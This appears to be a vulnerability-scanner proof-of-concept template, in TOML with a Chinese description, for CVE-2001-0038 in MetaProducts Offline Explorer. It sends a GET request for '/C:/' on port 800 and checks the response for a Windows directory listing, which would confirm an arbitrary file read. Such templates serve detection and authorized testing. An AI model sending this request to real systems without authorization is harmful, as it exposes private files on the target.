[info]
author = "ave"
description = "通过向 Offline Explorer 默认端口 800 发送 GET 请求访问 C:/ 盘符，验证目录遍历漏洞。Offline Explorer 1.4 SR2 之前版本未对请求路径进行校验，允许远程攻击者读取任意文件。"
id = "POC-AVE-2001-0019"
name = "MetaProducts Offline Explorer 1.x 任意文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2001-0019"]
vuln_id = [
    "CVE-2001-0038",
    "AVE-2001-0019",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/C:/"
port = "800"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Directory of",
    "Volume in drive",
]
